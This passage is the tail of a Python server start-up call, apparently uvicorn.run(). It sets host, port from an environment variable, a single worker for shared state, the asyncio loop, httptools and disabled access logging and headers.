        host="0.0.0.0",
        port=int(os.getenv("PORT", "8000")),
        workers=1,        # Estado compartido + workers -> 1
        loop="asyncio",
        http="httptools",
        lifespan="on",
        access_log=False,
        server_header=False,
        date_header=False
    )








